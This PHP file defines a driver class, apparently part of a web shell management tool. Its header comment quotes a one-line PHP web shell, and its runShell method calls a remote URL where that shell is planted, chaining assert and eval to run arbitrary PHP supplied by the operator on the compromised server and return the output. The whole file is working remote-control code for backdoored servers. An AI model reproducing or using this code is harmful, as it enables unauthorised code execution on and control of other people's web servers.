<?php

/**
 * shell1Driver
 * Shell: 
 * <?php $_GET[a]($_GET[b]); ?>
 */
class shell1Driver extends ShellDriver {

    public $shellCode = '$_GET[a]($_GET[b])';

    public function runShell($script, $ext = array()) {
        $params['a'] = 'assert';
        $params['b'] = 'eval($_POST["s"])==null';
        $post['s'] = $script;
        $c = strpos($this->url, '?') ? '&' : '?';
        $url = $this->url . $c . http_build_query($params);
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, array_merge($post, $ext));
        $data = curl_exec($ch);
        curl_close($ch);
        return trim($data);
    }

}
